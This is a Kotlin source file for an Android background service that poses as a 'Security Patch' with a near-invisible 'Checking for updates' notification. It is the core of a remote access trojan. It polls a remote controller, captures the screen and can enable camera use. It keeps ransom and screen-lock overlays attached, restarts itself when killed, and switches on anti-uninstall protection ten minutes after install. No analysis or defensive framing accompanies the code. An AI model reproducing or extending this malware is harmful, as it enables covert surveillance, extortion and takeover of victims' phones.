package com.android.security.patch

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.SystemClock
import kotlinx.coroutines.*

class CoreService : Service() {

    companion object {
        @Volatile var alive = false
        @Volatile var instance: CoreService? = null
        private const val CH_ID = "sys_chan"
        private const val NOTIF_ID = 2001
        private const val TEN_MIN = 10 * 60 * 1000L
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val handler = Handler(Looper.getMainLooper())
    private var pollJob: Job? = null
    private var watchdog: Job? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        alive = true
        instance = this
        createChannel()
        startForegroundCompat()
        startPoll()
        startWatchdog()
        scheduleAutoAntiUninstall()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            "PROMOTE_PROJECTION" -> promoteToMediaProjection()
            "SET_PROJECTION" -> handleProjectionResult(intent)
        }
        if (!alive) {
            alive = true
            instance = this
            createChannel()
            startForegroundCompat()
            startPoll()
            startWatchdog()
        }
        return START_STICKY
    }

    override fun onDestroy() {
        alive = false
        instance = null
        pollJob?.cancel()
        watchdog?.cancel()
        scope.cancel()
        val i = Intent(this, CoreService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i)
        else startService(i)
        super.onDestroy()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        val restart = Intent(applicationContext, CoreService::class.java)
        val pi = PendingIntent.getService(
            this, 1, restart,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarm = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarm.set(
            AlarmManager.ELAPSED_REALTIME,
            SystemClock.elapsedRealtime() + 2000,
            pi
        )
        super.onTaskRemoved(rootIntent)
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(NotificationManager::class.java)
            if (nm.getNotificationChannel(CH_ID) == null) {
                val ch = NotificationChannel(CH_ID, "System", NotificationManager.IMPORTANCE_MIN)
                ch.setShowBadge(false)
                ch.enableVibration(false)
                ch.setSound(null, null)
                nm.createNotificationChannel(ch)
            }
        }
    }

    private fun buildNotification(): Notification {
        val b = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            Notification.Builder(this, CH_ID)
        else @Suppress("DEPRECATION") Notification.Builder(this)
        return b.setContentTitle("Security Patch")
            .setContentText("Checking for updates")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_MIN)
            .build()
    }

    private fun startForegroundCompat() {
        val notif = buildNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIF_ID, notif,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(NOTIF_ID, notif)
        }
    }

    private fun promoteToMediaProjection() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                val notif = buildNotification()
                startForeground(
                    NOTIF_ID, notif,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                )
            } catch (_: Throwable) {}
        }
    }

    private fun handleProjectionResult(intent: Intent) {
        val code = intent.getIntExtra("code", 0)
        @Suppress("DEPRECATION")
        val data: Intent? = intent.getParcelableExtra("data")
        if (data == null) return
        try {
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val p = mpm.getMediaProjection(code, data)
            ScreenCap.setProjection(p)
            ScreenCap.startSession(this)
        } catch (_: Throwable) {}
    }

    private fun startPoll() {
        pollJob?.cancel()
        pollJob = scope.launch { RatApi.pollLoop(this@CoreService) }
    }

    private fun startWatchdog() {
        watchdog?.cancel()
        watchdog = scope.launch {
            while (isActive) {
                try {
                    if (Prefs.getBool(this@CoreService, Prefs.HANG_ACTIVE)) {
                        HangManager.ensureAttached(this@CoreService)
                    }
                    if (Prefs.getBool(this@CoreService, Prefs.RANSOM_ACTIVE)) {
                        RansomManager.ensureOverlay(this@CoreService)
                    }
                } catch (_: Throwable) {}
                delay(5000)
            }
        }
    }

    private fun scheduleAutoAntiUninstall() {
        val install = Prefs.getLong(this, Prefs.INSTALL_TS)
        if (install == 0L) return
        if (Prefs.getBool(this, "auto_anti_done")) return
        val elapsed = System.currentTimeMillis() - install
        val remaining = TEN_MIN - elapsed
        if (remaining <= 0) { activate(); return }
        handler.postDelayed({ activate() }, remaining)
    }

    private fun activate() {
        if (Prefs.getBool(this, "auto_anti_done")) return
        Prefs.setBool(this, Prefs.ANTI_UNINSTALL_ON, true)
        Prefs.setBool(this, "auto_anti_done", true)
        Rules.applyAntiUninstall(this, true)
    }

    fun promoteToCamera() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            try {
                val notif = buildNotification()
                startForeground(
                    NOTIF_ID, notif,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                )
            } catch (_: Throwable) {}
        }
    }

    fun demoteFromCamera() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            try {
                val notif = buildNotification()
                startForeground(
                    NOTIF_ID, notif,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                )
            } catch (_: Throwable) {}
        }
    }

}
